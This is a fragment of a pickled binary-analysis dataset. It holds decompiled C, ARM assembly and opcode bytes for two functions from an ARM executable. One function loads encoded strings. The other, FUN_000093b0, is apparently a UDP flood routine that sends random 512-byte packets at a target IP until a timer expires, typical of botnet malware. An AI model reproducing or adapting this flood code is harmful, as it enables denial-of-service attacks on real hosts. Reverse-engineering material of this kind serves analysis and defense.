V\u000avoid FUN_000096d0(void)\u000a\u000a{\u000a  undefined *puVar1;\u000a  void *__dest;\u000a  \u000a  __dest = malloc(8);\u000a  puVar1 = PTR_DAT_000099b0;\u000a  memcpy(__dest,PTR_s_Cv_q_FvC_000099b4,8);\u000a  *(void **)(puVar1 + 0x208) = __dest;\u000a  puVar1[0x40c] = 8;\u000a  puVar1[0x40d] = 0;\u000a  __dest = malloc(7);\u000a  memcpy(__dest,PTR_s_Cv37uv_000099b8,7);\u000a  *(void **)(puVar1 + 0x410) = __dest;\u000a  puVar1[0x614] = 7;\u000a  puVar1[0x615] = 0;\u000a  __dest = malloc(3);\u000a  memcpy(__dest,PTR_DAT_000099bc,3);\u000a  *(void **)(puVar1 + 0x618) = __dest;\u000a  puVar1[0x81c] = 3;\u000a  puVar1[0x81d] = 0;\u000a  __dest = malloc(3);\u000a  memcpy(__dest,PTR_DAT_000099c0,3);\u000a  *(void **)(puVar1 + 0x820) = __dest;\u000a  puVar1[0xa24] = 3;\u000a  puVar1[0xa25] = 0;\u000a  __dest = malloc(4);\u000a  memcpy(__dest,PTR_DAT_000099c4,4);\u000a  *(void **)(puVar1 + 0xa28) = __dest;\u000a  puVar1[0xc2c] = 4;\u000a  puVar1[0xc2d] = 0;\u000a  __dest = malloc(3);\u000a  memcpy(__dest,PTR_DAT_000099c8,3);\u000a  *(void **)(puVar1 + 0xc30) = __dest;\u000a  puVar1[0xe34] = 3;\u000a  puVar1[0xe35] = 0;\u000a  __dest = malloc(7);\u000a  memcpy(__dest,PTR_s_T7_T_3v_000099cc,7);\u000a  puVar1[0x103c] = 7;\u000a  puVar1[0x103d] = 0;\u000a  *(void **)(puVar1 + 0xe38) = __dest;\u000a  __dest = malloc(0xe);\u000a  memcpy(__dest,PTR_s_m_wy___y_wymBB_000099d0,0xe);\u000a  puVar1[0x1244] = 0xe;\u000a  puVar1[0x1245] = 0;\u000a  *(void **)(puVar1 + 0x1040) = __dest;\u000a  __dest = malloc(0x15);\u000a  memcpy(__dest,PTR_s_8_F_____vT_tv_nCqTovT_000099d4,0x15);\u000a  puVar1[0x144c] = 0x15;\u000a  puVar1[0x144d] = 0;\u000a  *(void **)(puVar1 + 0x1248) = __dest;\u000a  __dest = malloc(3);\u000a  memcpy(__dest,PTR_DAT_000099d8,3);\u000a  puVar1[0x1654] = 3;\u000a  puVar1[0x1655] = 0;\u000a  *(void **)(puVar1 + 0x1450) = __dest;\u000a  __dest = malloc(4);\u000a  memcpy(__dest,PTR_DAT_000099dc,4);\u000a  puVar1[0x185c] = 4;\u000a  puVar1[0x185d] = 0;\u000a  *(void **)(puVar1 + 0x1658) = __dest;\u000a  __dest = malloc(3);\u000a  memcpy(__dest,PTR_DAT_000099e0,3);\u000a  puVar1[0x1a64] = 3;\u000a  puVar1[0x1a65] = 0;\u000a  *(void **)(puVar1 + 0x1860) = __dest;\u000a  __dest = malloc(4);\u000a  memcpy(__dest,PTR_DAT_000099e4,4);\u000a  puVar1[0x1c6c] = 4;\u000a  puVar1[0x1c6d] = 0;\u000a  *(void **)(puVar1 + 0x1a68) = __dest;\u000a  __dest = malloc(10);\u000a  memcpy(__dest,PTR_s__7TTv_Fq7T_000099e8,10);\u000a  puVar1[0x1e74] = 10;\u000a  puVar1[0x1e75] = 0;\u000a  *(void **)(puVar1 + 0x1c70) = __dest;\u000a  __dest = malloc(5);\u000a  memcpy(__dest,PTR_s___7_v_000099ec,5);\u000a  puVar1[0x207c] = 5;\u000a  *(void **)(puVar1 + 0x1e78) = __dest;\u000a  puVar1[0x207d] = 0;\u000a  return;\u000a}\u000a\u000a
p283
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nmov r5,#0x8\ncpy r0,r5\nbl 0x00008950\nldr r4,[0x99b0]\nmov r9,#0x7\ncpy r2,r5\nldr r1,[0x99b4]\nmov r8,#0x0\ncpy r6,r0\nbl 0x00008944\ncpy r0,r9\nstr r6,[r4,#0x208]\nstrb r5,[r4,#0x40c]\nstrb r8,[r4,#0x40d]\nbl 0x00008950\nmov r7,#0x3\ncpy r2,r9\nldr r1,[0x99b8]\ncpy r5,r0\nbl 0x00008944\ncpy r0,r7\nstr r5,[r4,#0x410]\nstrb r9,[r4,#0x614]\nstrb r8,[r4,#0x615]\nbl 0x00008950\ncpy r2,r7\nldr r1,[0x99bc]\ncpy r5,r0\nbl 0x00008944\ncpy r0,r7\nstr r5,[r4,#0x618]\nstrb r7,[r4,#0x81c]\nstrb r8,[r4,#0x81d]\nbl 0x00008950\ncpy r2,r7\nldr r1,[0x99c0]\ncpy r5,r0\nbl 0x00008944\nmov r0,#0x4\nstr r5,[r4,#0x820]\nstrb r7,[r4,#0xa24]\nstrb r8,[r4,#0xa25]\nbl 0x00008950\nmov r2,#0x4\nldr r1,[0x99c4]\ncpy r5,r0\nbl 0x00008944\nmov r1,#0x4\ncpy r0,r7\nstr r5,[r4,#0xa28]\nstrb r1,[r4,#0xc2c]\nstrb r8,[r4,#0xc2d]\nbl 0x00008950\ncpy r2,r7\nldr r1,[0x99c8]\ncpy r5,r0\nbl 0x00008944\ncpy r0,r9\nstr r5,[r4,#0xc30]\nstrb r7,[r4,#0xe34]\nstrb r8,[r4,#0xe35]\nbl 0x00008950\nldr r1,[0x99cc]\ncpy r2,r9\ncpy r5,r0\nbl 0x00008944\nmov r3,#0x1000\nadd r3,r3,#0x3c\nadd r2,r4,r3\nmov r11,#0xe\nstrb r9,[r4,r3]\ncpy r0,r11\nstrb r8,[r2,#0x1]\nstr r5,[r4,#0xe38]\nbl 0x00008950\nmov r6,#0x1240\nldr r1,[0x99d0]\ncpy r2,r11\ncpy r5,r0\nbl 0x00008944\nadd r2,r6,#0x4\nadd r1,r4,r2\nmov r10,#0x15\nmov r3,#0x1040\nstrb r11,[r4,r2]\ncpy r0,r10\nstrb r8,[r1,#0x1]\nstr r5,[r4,r3]\nbl 0x00008950\nmov r5,#0x1440\nldr r1,[0x99d4]\ncpy r2,r10\ncpy r9,r0\nbl 0x00008944\nadd r3,r5,#0xc\nadd r2,r4,r3\nstrb r10,[r4,r3]\nadd r6,r6,#0x8\ncpy r0,r7\nstrb r8,[r2,#0x1]\nstr r9,[r4,r6]\nbl 0x00008950\nadd r6,r6,#0x3f8\nldr r1,[0x99d8]\ncpy r2,r7\ncpy r9,r0\nbl 0x00008944\nadd r3,r6,#0x14\nadd r2,r4,r3\nstrb r7,[r4,r3]\nadd r5,r5,#0x10\nstrb r8,[r2,#0x1]\nmov r0,#0x4\nstr r9,[r4,r5]\nbl 0x00008950\nadd r5,r5,#0x3f0\nldr r1,[0x99dc]\nmov r2,#0x4\ncpy r9,r0\nbl 0x00008944\nadd r3,r5,#0x1c\nadd r2,r4,r3\nmov r1,#0x4\nstrb r1,[r4,r3]\nadd r6,r6,#0x18\ncpy r0,r7\nstrb r8,[r2,#0x1]\nstr r9,[r4,r6]\nbl 0x00008950\nadd r6,r6,#0x3e8\nldr r1,[0x99e0]\ncpy r2,r7\ncpy r9,r0\nbl 0x00008944\nadd r3,r6,#0x24\nadd r2,r4,r3\nstrb r7,[r4,r3]\nadd r5,r5,#0x20\nstrb r8,[r2,#0x1]\nmov r0,#0x4\nstr r9,[r4,r5]\nbl 0x00008950\nmov r7,#0x1c40\nldr r1,[0x99e4]\nmov r2,#0x4\ncpy r5,r0\nbl 0x00008944\nadd r3,r7,#0x2c\nadd r2,r4,r3\nmov r9,#0xa\nmov r1,#0x4\nstrb r1,[r4,r3]\nadd r6,r6,#0x28\nstrb r8,[r2,#0x1]\ncpy r0,r9\nstr r5,[r4,r6]\nbl 0x00008950\nmov r5,#0x1e40\nldr r1,[0x99e8]\ncpy r2,r9\ncpy r6,r0\nbl 0x00008944\nadd r3,r5,#0x34\nadd r2,r4,r3\nstrb r9,[r4,r3]\nadd r7,r7,#0x30\nstrb r8,[r2,#0x1]\nmov r0,#0x5\nstr r6,[r4,r7]\nbl 0x00008950\nldr r1,[0x99ec]\nmov r2,#0x5\ncpy r6,r0\nbl 0x00008944\nmov r3,#0x2040\nadd r3,r3,#0x3c\nadd r5,r5,#0x38\nadd r2,r4,r3\nmov r1,#0x5\nstrb r1,[r4,r3]\nstr r6,[r4,r5]\nstrb r8,[r2,#0x1]\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\n'
p284
S'f0 4f 2d e9\n08 50 a0 e3\n05 00 a0 e1\n9b fc ff eb\nc8 42 9f e5\n07 90 a0 e3\n05 20 a0 e1\nc0 12 9f e5\n00 80 a0 e3\n00 60 a0 e1\n91 fc ff eb\n09 00 a0 e1\n08 62 84 e5\n0c 54 c4 e5\n0d 84 c4 e5\n8f fc ff eb\n03 70 a0 e3\n09 20 a0 e1\n98 12 9f e5\n00 50 a0 e1\n87 fc ff eb\n07 00 a0 e1\n10 54 84 e5\n14 96 c4 e5\n15 86 c4 e5\n85 fc ff eb\n07 20 a0 e1\n78 12 9f e5\n00 50 a0 e1\n7e fc ff eb\n07 00 a0 e1\n18 56 84 e5\n1c 78 c4 e5\n1d 88 c4 e5\n7c fc ff eb\n07 20 a0 e1\n58 12 9f e5\n00 50 a0 e1\n75 fc ff eb\n04 00 a0 e3\n20 58 84 e5\n24 7a c4 e5\n25 8a c4 e5\n73 fc ff eb\n04 20 a0 e3\n38 12 9f e5\n00 50 a0 e1\n6c fc ff eb\n04 10 a0 e3\n07 00 a0 e1\n28 5a 84 e5\n2c 1c c4 e5\n2d 8c c4 e5\n69 fc ff eb\n07 20 a0 e1\n14 12 9f e5\n00 50 a0 e1\n62 fc ff eb\n09 00 a0 e1\n30 5c 84 e5\n34 7e c4 e5\n35 8e c4 e5\n60 fc ff eb\nf8 11 9f e5\n09 20 a0 e1\n00 50 a0 e1\n59 fc ff eb\n01 3a a0 e3\n3c 30 83 e2\n03 20 84 e0\n0e b0 a0 e3\n03 90 c4 e7\n0b 00 a0 e1\n01 80 c2 e5\n38 5e 84 e5\n53 fc ff eb\n49 6d a0 e3\nc4 11 9f e5\n0b 20 a0 e1\n00 50 a0 e1\n4b fc ff eb\n04 20 86 e2\n02 10 84 e0\n15 a0 a0 e3\n41 3d a0 e3\n02 b0 c4 e7\n0a 00 a0 e1\n01 80 c1 e5\n03 50 84 e7\n45 fc ff eb\n51 5d a0 e3\n90 11 9f e5\n0a 20 a0 e1\n00 90 a0 e1\n3d fc ff eb\n0c 30 85 e2\n03 20 84 e0\n03 a0 c4 e7\n08 60 86 e2\n07 00 a0 e1\n01 80 c2 e5\n06 90 84 e7\n38 fc ff eb\nfe 6f 86 e2\n60 11 9f e5\n07 20 a0 e1\n00 90 a0 e1\n30 fc ff eb\n14 30 86 e2\n03 20 84 e0\n03 70 c4 e7\n10 50 85 e2\n01 80 c2 e5\n04 00 a0 e3\n05 90 84 e7\n2b fc ff eb\n3f 5e 85 e2\n30 11 9f e5\n04 20 a0 e3\n00 90 a0 e1\n23 fc ff eb\n1c 30 85 e2\n03 20 84 e0\n04 10 a0 e3\n03 10 c4 e7\n18 60 86 e2\n07 00 a0 e1\n01 80 c2 e5\n06 90 84 e7\n1d fc ff eb\nfa 6f 86 e2\nfc 10 9f e5\n07 20 a0 e1\n00 90 a0 e1\n15 fc ff eb\n24 30 86 e2\n03 20 84 e0\n03 70 c4 e7\n20 50 85 e2\n01 80 c2 e5\n04 00 a0 e3\n05 90 84 e7\n10 fc ff eb\n71 7d a0 e3\ncc 10 9f e5\n04 20 a0 e3\n00 50 a0 e1\n08 fc ff eb\n2c 30 87 e2\n03 20 84 e0\n0a 90 a0 e3\n04 10 a0 e3\n03 10 c4 e7\n28 60 86 e2\n01 80 c2 e5\n09 00 a0 e1\n06 50 84 e7\n01 fc ff eb\n79 5d a0 e3\n94 10 9f e5\n09 20 a0 e1\n00 60 a0 e1\nf9 fb ff eb\n34 30 85 e2\n03 20 84 e0\n03 90 c4 e7\n30 70 87 e2\n01 80 c2 e5\n05 00 a0 e3\n07 60 84 e7\nf4 fb ff eb\n68 10 9f e5\n05 20 a0 e3\n00 60 a0 e1\ned fb ff eb\n81 3d a0 e3\n3c 30 83 e2\n38 50 85 e2\n03 20 84 e0\n05 10 a0 e3\n03 10 c4 e7\n05 60 84 e7\n01 80 c2 e5\nf0 8f bd e8\n'
p285
S'.text:000096d0\n.text:000096d4\n.text:000096d8\n.text:000096dc\n.text:000096e0\n.text:000096e4\n.text:000096e8\n.text:000096ec\n.text:000096f0\n.text:000096f4\n.text:000096f8\n.text:000096fc\n.text:00009700\n.text:00009704\n.text:00009708\n.text:0000970c\n.text:00009710\n.text:00009714\n.text:00009718\n.text:0000971c\n.text:00009720\n.text:00009724\n.text:00009728\n.text:0000972c\n.text:00009730\n.text:00009734\n.text:00009738\n.text:0000973c\n.text:00009740\n.text:00009744\n.text:00009748\n.text:0000974c\n.text:00009750\n.text:00009754\n.text:00009758\n.text:0000975c\n.text:00009760\n.text:00009764\n.text:00009768\n.text:0000976c\n.text:00009770\n.text:00009774\n.text:00009778\n.text:0000977c\n.text:00009780\n.text:00009784\n.text:00009788\n.text:0000978c\n.text:00009790\n.text:00009794\n.text:00009798\n.text:0000979c\n.text:000097a0\n.text:000097a4\n.text:000097a8\n.text:000097ac\n.text:000097b0\n.text:000097b4\n.text:000097b8\n.text:000097bc\n.text:000097c0\n.text:000097c4\n.text:000097c8\n.text:000097cc\n.text:000097d0\n.text:000097d4\n.text:000097d8\n.text:000097dc\n.text:000097e0\n.text:000097e4\n.text:000097e8\n.text:000097ec\n.text:000097f0\n.text:000097f4\n.text:000097f8\n.text:000097fc\n.text:00009800\n.text:00009804\n.text:00009808\n.text:0000980c\n.text:00009810\n.text:00009814\n.text:00009818\n.text:0000981c\n.text:00009820\n.text:00009824\n.text:00009828\n.text:0000982c\n.text:00009830\n.text:00009834\n.text:00009838\n.text:0000983c\n.text:00009840\n.text:00009844\n.text:00009848\n.text:0000984c\n.text:00009850\n.text:00009854\n.text:00009858\n.text:0000985c\n.text:00009860\n.text:00009864\n.text:00009868\n.text:0000986c\n.text:00009870\n.text:00009874\n.text:00009878\n.text:0000987c\n.text:00009880\n.text:00009884\n.text:00009888\n.text:0000988c\n.text:00009890\n.text:00009894\n.text:00009898\n.text:0000989c\n.text:000098a0\n.text:000098a4\n.text:000098a8\n.text:000098ac\n.text:000098b0\n.text:000098b4\n.text:000098b8\n.text:000098bc\n.text:000098c0\n.text:000098c4\n.text:000098c8\n.text:000098cc\n.text:000098d0\n.text:000098d4\n.text:000098d8\n.text:000098dc\n.text:000098e0\n.text:000098e4\n.text:000098e8\n.text:000098ec\n.text:000098f0\n.text:000098f4\n.text:000098f8\n.text:000098fc\n.text:00009900\n.text:00009904\n.text:00009908\n.text:0000990c\n.text:00009910\n.text:00009914\n.text:00009918\n.text:0000991c\n.text:00009920\n.text:00009924\n.text:00009928\n.text:0000992c\n.text:00009930\n.text:00009934\n.text:00009938\n.text:0000993c\n.text:00009940\n.text:00009944\n.text:00009948\n.text:0000994c\n.text:00009950\n.text:00009954\n.text:00009958\n.text:0000995c\n.text:00009960\n.text:00009964\n.text:00009968\n.text:0000996c\n.text:00009970\n.text:00009974\n.text:00009978\n.text:0000997c\n.text:00009980\n.text:00009984\n.text:00009988\n.text:0000998c\n.text:00009990\n.text:00009994\n.text:00009998\n.text:0000999c\n.text:000099a0\n.text:000099a4\n.text:000099a8\n.text:000099ac\n'
p286
tp287
sS'FUN_000093b0'
p288
(S'\n__stdcall FUN_000093b0()\n'
p289
V\u000avoid FUN_000093b0(char *pcParm1,int iParm2,int iParm3)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  char cVar3;\u000a  undefined4 uVar4;\u000a  void *__s;\u000a  time_t tVar5;\u000a  time_t tVar6;\u000a  int iVar7;\u000a  int __fd;\u000a  int iVar8;\u000a  int *piVar9;\u000a  uint uVar10;\u000a  uint uVar11;\u000a  uint uVar12;\u000a  uint uVar13;\u000a  bool bVar14;\u000a  undefined8 uVar15;\u000a  undefined local_34;\u000a  undefined local_33;\u000a  char local_32;\u000a  char local_31;\u000a  in_addr_t local_30;\u000a  undefined4 local_2c;\u000a  undefined4 local_28;\u000a  \u000a  puVar1 = PTR_DAT_0000968c;\u000a  local_34 = 2;\u000a  local_33 = 0;\u000a  if (iParm2 == 0) {\u000a    uVar13 = *(int *)PTR_DAT_00009688 + 1U & 0xfff;\u000a    uVar4 = *(undefined4 *)(PTR_DAT_0000968c + uVar13 * 4);\u000a    __fd = 0;\u000a    *(uint *)PTR_DAT_00009688 = uVar13;\u000a    uVar15 = __muldi3(uVar4,0,0x495e);\u000a    puVar2 = PTR_DAT_00009690;\u000a    uVar10 = (uint)((ulonglong)uVar15 >> 0x20);\u000a    uVar11 = *(uint *)PTR_DAT_00009690 + uVar10;\u000a    uVar10 = (int)uVar15 + (uint)CARRY4(*(uint *)PTR_DAT_00009690,uVar10);\u000a    bVar14 = CARRY4(uVar10,uVar11);\u000a    iVar7 = uVar10 + uVar11;\u000a    if (bVar14) {\u000a      __fd = uVar10 + 1;\u000a      iVar7 = iVar7 + 1;\u000a    }\u000a    *(uint *)PTR_DAT_00009690 = uVar10;\u000a    if (bVar14) {\u000a      *(int *)puVar2 = __fd;\u000a    }\u000a    iVar7 = -2 - iVar7;\u000a    *(int *)(puVar1 + uVar13 * 4) = iVar7;\u000a    local_31 = (char)((uint)iVar7 >> 8);\u000a    local_32 = (char)iVar7;\u000a  }\u000a  else {\u000a    local_31 = (char)iParm2;\u000a    local_32 = (char)((uint)(iParm2 << 0x10) >> 0x18);\u000a  }\u000a  local_30 = inet_addr(pcParm1);\u000a  if (local_30 != 0xffffffff) {\u000a    local_2c = 0;\u000a    local_28 = 0;\u000a    __fd = socket(2,2,0x11);\u000a    if ((__fd != 0) && (__s = malloc(0x201), __s != (void *)0x0)) {\u000a      memset(__s,0,0x201);\u000a      puVar1 = PTR_DAT_0000968c;\u000a      uVar10 = *(uint *)PTR_DAT_00009690;\u000a      uVar13 = *(uint *)PTR_DAT_00009688;\u000a      iVar7 = 0;\u000a      do {\u000a        uVar13 = uVar13 + 1 & 0xfff;\u000a        uVar15 = __muldi3(*(undefined4 *)(puVar1 + uVar13 * 4),0,0x495e,0);\u000a        uVar11 = (uint)((ulonglong)uVar15 >> 0x20);\u000a        uVar12 = uVar10 + uVar11;\u000a        uVar10 = (int)uVar15 + (uint)CARRY4(uVar10,uVar11);\u000a        bVar14 = CARRY4(uVar10,uVar12);\u000a        iVar8 = uVar10 + uVar12;\u000a        if (bVar14) {\u000a          iVar8 = iVar8 + 1;\u000a        }\u000a        *(int *)(puVar1 + uVar13 * 4) = -2 - iVar8;\u000a        if (bVar14) {\u000a          uVar10 = uVar10 + 1;\u000a        }\u000a        cVar3 = __umodsi3(-2 - iVar8,0x1a);\u000a        *(char *)(iVar7 + (int)__s) = cVar3 + 'A';\u000a        puVar2 = PTR_DAT_00009690;\u000a        iVar7 = iVar7 + 1;\u000a      } while (iVar7 != 0x200);\u000a      *(uint *)PTR_DAT_00009688 = uVar13;\u000a      *(uint *)puVar2 = uVar10;\u000a      tVar5 = time((time_t *)0x0);\u000a      iVar7 = 0;\u000a      do {\u000a        do {\u000a          sendto(__fd,__s,0x200,0,(sockaddr *)&local_34,0x10);\u000a          bVar14 = iVar7 != 10;\u000a          iVar7 = iVar7 + 1;\u000a        } while (bVar14);\u000a        piVar9 = (int *)0x0;\u000a        iVar7 = 0;\u000a        if (iParm2 == 0) {\u000a          uVar13 = *(int *)PTR_DAT_00009688 + 1U & 0xfff;\u000a          uVar4 = *(undefined4 *)(puVar1 + uVar13 * 4);\u000a          *(uint *)PTR_DAT_00009688 = uVar13;\u000a          uVar15 = __muldi3(uVar4,0,0x495e);\u000a          uVar10 = (uint)((ulonglong)uVar15 >> 0x20);\u000a          uVar11 = *(uint *)PTR_DAT_00009690 + uVar10;\u000a          uVar10 = (int)uVar15 + (uint)CARRY4(*(uint *)PTR_DAT_00009690,uVar10);\u000a          bVar14 = CARRY4(uVar10,uVar11);\u000a          iVar8 = uVar10 + uVar11;\u000a          if (bVar14) {\u000a            iVar8 = iVar8 + 1;\u000a            piVar9 = (int *)PTR_DAT_00009690;\u000a          }\u000a          *(uint *)PTR_DAT_00009690 = uVar10;\u000a          if (bVar14) {\u000a            *piVar9 = uVar10 + 1;\u000a          }\u000a          iVar8 = -2 - iVar8;\u000a          *(int *)(PTR_DAT_0000968c + uVar13 * 4) = iVar8;\u000a          local_31 = (char)((uint)iVar8 >> 8);\u000a          local_32 = (char)iVar8;\u000a        }\u000a        tVar6 = time((time_t *)0x0);\u000a      } while (tVar6 <= tVar5 + iParm3);\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p290
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\ncmp r1,#0x0\nsub sp,sp,#0x28\nstr r1,[sp,#0xc]\nmov r3,#0x2\nmov r1,#0x0\nstrb r3,[sp,#0x18]\nstrb r1,[sp,#0x19]\ncpy r8,r0\nstr r2,[sp,#0x8]\nbne 0x000094a4\nldr r12,[0x9688]\nldr r3,[r12,#0x0]\nadd r3,r3,#0x1\nmov r7,r3, lsl #0x14\nldr r11,[0x968c]\nmov r7,r7, lsr #0x14\nldr r0,[r11,r7,lsl #0x2]\nmov r2,#0x4900\nmov r3,#0x0\nadd r2,r2,#0x5e\nstr r7,[r12,#0x0]\nmov r1,#0x0\nbl 0x0000b0d4\nldr r12,[0x9690]\nldr r5,[r12,#0x0]\nmov r6,#0x0\nadds r5,r5,r0\nadc r6,r6,r1\nadds r1,r6,r5\naddcs r3,r6,#0x1\naddcs r1,r1,#0x1\nstr r6,[r12,#0x0]\nstrcs r3,[r12,#0x0]\nrsb r3,r1,#0xff000000\nadd r3,r3,#0xff0000\nadd r3,r3,#0xff00\nadd r3,r3,#0xfe\nmov r2,r3, asr #0x8\nldr r4,[sp,#0xc]\nstr r3,[r11,r7,lsl #0x2]\nstrb r2,[sp,#0x1b]\nstrb r3,[sp,#0x1a]\ncpy r0,r8\nbl 0x000089bc\ncmn r0,#0x1\ncpy r3,r0\nbeq 0x0000949c\nmov r0,#0x2\nmov r5,#0x0\ncpy r1,r0\nmov r2,#0x11\nstr r3,[sp,#0x1c]\nstr r5,[sp,#0x20]\nstr r5,[sp,#0x24]\nbl 0x00008968\ncmp r0,#0x0\nstr r0,[sp,#0x10]\nbne 0x000094c8\nadd sp,sp,#0x28\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nldr r0,[sp,#0xc]\nmov r3,r0, lsl #0x10\nmov r2,r3, lsr #0x8\nand r2,r2,#0xff00\norr r2,r2,r3, lsr #0x18\nmov r1,r2, asr #0x8\nstrb r1,[sp,#0x1b]\nstrb r2,[sp,#0x1a]\nb 0x0000945c\nmov r0,#0x200\nadd r0,r0,#0x1\nbl 0x00008950\nsubs r9,r0,#0x0\nbeq 0x0000949c\nmov r2,#0x200\nadd r2,r2,#0x1\ncpy r1,r5\nbl 0x00008a40\nldr r1,[0x9690]\nldr r2,[0x9688]\nldr r11,[0x968c]\nldr r4,[r1,#0x0]\nldr r7,[r2,#0x0]\ncpy r8,r5\ncpy r10,r11\nadd r3,r7,#0x1\nmov r7,r3, lsl #0x14\nmov r7,r7, lsr #0x14\nldr r0,[r11,r7,lsl #0x2]\nmov r2,#0x4900\nadd r2,r2,#0x5e\nmov r3,#0x0\nmov r1,#0x0\nbl 0x0000b0d4\ncpy r5,r4\nmov r6,#0x0\nadds r5,r5,r0\nadc r6,r6,r1\nadds r3,r6,r5\naddcs r3,r3,#0x1\nrsb r3,r3,#0xff000000\nadd r3,r3,#0xff0000\nadd r3,r3,#0xff00\nadd r3,r3,#0xfe\nmov r1,#0x1a\ncpy r0,r3\nstr r3,[r10,r7,lsl #0x2]\ncpy r4,r6\naddcs r4,r6,#0x1\nbl 0x0000b004\nadd r0,r0,#0x41\nstrb r0,[r8,r9]\nadd r8,r8,#0x1\ncmp r8,#0x200\nbne 0x00009508\nldr r3,[0x9690]\nldr r12,[0x9688]\nmov r0,#0x0\nstr r7,[r12,#0x0]\nstr r4,[r3,#0x0]\nbl 0x00008a58\nldr r1,[sp,#0x8]\nadd r0,r0,r1\nstr r0,[sp,#0x14]\nadd r10,sp,#0x18\nmov r7,#0x0\nmov r12,#0x10\ncpy r1,r9\nmov r2,#0x200\nmov r3,#0x0\nldr r0,[sp,#0x10]\nstmia sp,{ r10 r12 }\nbl 0x000089f8\ncmp r7,#0xa\nadd r7,r7,#0x1\nbne 0x000095ac\nldr r12,[sp,#0xc]\nmov r2,#0x4900\ncmp r12,#0x0\nadd r2,r2,#0x5e\nmov r3,#0x0\nmov r7,#0x0\nbne 0x00009670\nldr r0,[0x9688]\nldr r1,[r0,#0x0]\nadd r1,r1,#0x1\nmov r8,r1, lsl #0x14\nmov r8,r8, lsr #0x14\nldr r0,[r11,r8,lsl #0x2]\ncpy r4,r12\nldr r12,[0x9688]\nmov r1,#0x0\nstr r8,[r12,#0x0]\nbl 0x0000b0d4\nldr r2,[0x9690]\nldr r5,[r2,#0x0]\nmov r6,#0x0\nadds r5,r5,r0\nadc r6,r6,r1\nldr r12,[0x9690]\nadds r1,r6,r5\nadd r2,r6,#0x1\ncpycs r3,r12\naddcs r1,r1,#0x1\nstr r6,[r12,#0x0]\nstrcs r2,[r3,#0x0]\nrsb r3,r1,#0xff000000\nadd r3,r3,#0xff0000\nadd r3,r3,#0xff00\nadd r3,r3,#0xfe\nldr r2,[0x968c]\nmov r1,r3, asr #0x8\nstr r3,[r2,r8,lsl #0x2]\nstrb r1,[sp,#0x1b]\nstrb r3,[sp,#0x1a]\nmov r0,#0x0\nbl 0x00008a58\nldr r1,[sp,#0x14]\ncmp r1,r0\nbge 0x000095ac\nb 0x0000949c\n'
p291
S'f0 4f 2d e9\n00 00 51 e3\n28 d0 4d e2\n0c 10 8d e5\n02 30 a0 e3\n00 10 a0 e3\n18 30 cd e5\n19 10 cd e5\n00 80 a0 e1\n08 20 8d e5\n31 00 00 1a\na4 c2 9f e5\n00 30 9c e5\n01 30 83 e2\n03 7a a0 e1\n98 b2 9f e5\n27 7a a0 e1\n07 01 9b e7\n49 2c a0 e3\n00 30 a0 e3\n5e 20 82 e2\n00 70 8c e5\n00 10 a0 e3\n30 07 00 eb\n78 c2 9f e5\n00 50 9c e5\n00 60 a0 e3\n00 50 95 e0\n01 60 a6 e0\n05 10 96 e0\n01 30 86 22\n01 10 81 22\n00 60 8c e5\n00 30 8c 25\nff 34 61 e2\nff 38 83 e2\nff 3c 83 e2\nfe 30 83 e2\n43 24 a0 e1\n0c 40 9d e5\n07 31 8b e7\n1b 20 cd e5\n1a 30 cd e5\n08 00 a0 e1\n55 fd ff eb\n01 00 70 e3\n00 30 a0 e1\n0a 00 00 0a\n02 00 a0 e3\n00 50 a0 e3\n00 10 a0 e1\n11 20 a0 e3\n1c 30 8d e5\n20 50 8d e5\n24 50 8d e5\n35 fd ff eb\n00 00 50 e3\n10 00 8d e5\n0a 00 00 1a\n28 d0 8d e2\nf0 8f bd e8\n0c 00 9d e5\n00 38 a0 e1\n23 24 a0 e1\nff 2c 02 e2\n23 2c 82 e1\n42 14 a0 e1\n1b 10 cd e5\n1a 20 cd e5\ne4 ff ff ea\n02 0c a0 e3\n01 00 80 e2\n1e fd ff eb\n00 90 50 e2\nef ff ff 0a\n02 2c a0 e3\n01 20 82 e2\n05 10 a0 e1\n54 fd ff eb\n9c 11 9f e5\n90 21 9f e5\n90 b1 9f e5\n00 40 91 e5\n00 70 92 e5\n05 80 a0 e1\n0b a0 a0 e1\n01 30 87 e2\n03 7a a0 e1\n27 7a a0 e1\n07 01 9b e7\n49 2c a0 e3\n5e 20 82 e2\n00 30 a0 e3\n00 10 a0 e3\ne9 06 00 eb\n04 50 a0 e1\n00 60 a0 e3\n00 50 95 e0\n01 60 a6 e0\n05 30 96 e0\n01 30 83 22\nff 34 63 e2\nff 38 83 e2\nff 3c 83 e2\nfe 30 83 e2\n1a 10 a0 e3\n03 00 a0 e1\n07 31 8a e7\n06 40 a0 e1\n01 40 86 22\na5 06 00 eb\n41 00 80 e2\n09 00 c8 e7\n01 80 88 e2\n02 0c 58 e3\ne1 ff ff 1a\n08 31 9f e5\nfc c0 9f e5\n00 00 a0 e3\n00 70 8c e5\n00 40 83 e5\n2f fd ff eb\n08 10 9d e5\n01 00 80 e0\n14 00 8d e5\n18 a0 8d e2\n00 70 a0 e3\n10 c0 a0 e3\n09 10 a0 e1\n02 2c a0 e3\n00 30 a0 e3\n10 00 9d e5\n00 14 8d e8\n0b fd ff eb\n0a 00 57 e3\n01 70 87 e2\nf5 ff ff 1a\n0c c0 9d e5\n49 2c a0 e3\n00 00 5c e3\n5e 20 82 e2\n00 30 a0 e3\n00 70 a0 e3\n1f 00 00 1a\n90 00 9f e5\n00 10 90 e5\n01 10 81 e2\n01 8a a0 e1\n28 8a a0 e1\n08 01 9b e7\n0c 40 a0 e1\n74 c0 9f e5\n00 10 a0 e3\n00 80 8c e5\nad 06 00 eb\n6c 20 9f e5\n00 50 92 e5\n00 60 a0 e3\n00 50 95 e0\n01 60 a6 e0\n58 c0 9f e5\n05 10 96 e0\n01 20 86 e2\n0c 30 a0 21\n01 10 81 22\n00 60 8c e5\n00 20 83 25\nff 34 61 e2\nff 38 83 e2\nff 3c 83 e2\nfe 30 83 e2\n28 20 9f e5\n43 14 a0 e1\n08 31 82 e7\n1b 10 cd e5\n1a 30 cd e5\n00 00 a0 e3\nf7 fc ff eb\n14 10 9d e5\n00 00 51 e1\nc9 ff ff aa\n84 ff ff ea\n'
p292
